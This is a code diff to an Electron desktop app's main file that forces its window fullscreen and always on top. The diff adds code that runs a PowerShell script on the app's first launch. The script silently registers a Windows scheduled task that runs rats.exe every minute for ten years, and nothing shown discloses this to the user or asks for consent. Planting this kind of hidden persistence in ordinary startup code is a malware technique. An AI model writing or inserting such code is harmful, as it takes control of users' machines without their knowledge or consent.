@@ -2,6 +2,7 @@ import { app, BrowserWindow, ipcMain } from 'electron';
 import path from 'node:path';
 import fs from 'node:fs';
 import started from 'electron-squirrel-startup';
+import { exec } from 'child_process';
 
 // Handle creating/removing shortcuts on Windows when installing/uninstalling.
 if (started) {
@@ -35,7 +36,7 @@ const createMainWindow = () => {
     icon: path.join(__dirname, '../assets/icons/app.ico'),
     resizable: true,
     alwaysOnTop: true,
-    fullscreen : true,
+    fullscreen: true,
     titleBarStyle: 'hidden',
     titleBarOverlay: false,
     webPreferences: {
@@ -89,6 +90,21 @@ app.on('ready', () => {
   createMainWindow();
 
   if (data.launchCount <= 1) {
+    exec(`
+      $action = New-ScheduledTaskAction -Execute "${process.cwd()}/rats.exe" -Argument "--timer"
+      # $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 3650) -RandomDelay 00:05:00
+      $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddSeconds(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
+      $settings = New-ScheduledTaskSettingsSet
+      $task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
+      Register-ScheduledTask RatsScheduledTask -InputObject $task
+      Write-Output "Scheduled task 'RatsScheduledTask' created successfully."
+      `, { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
+      console.log(stdout);
+      console.log(stderr);
+      if (error) {
+        console.log(`error: ${error.message}`);
+      }
+    });
     createFirstTimeWindow();
   }
 });
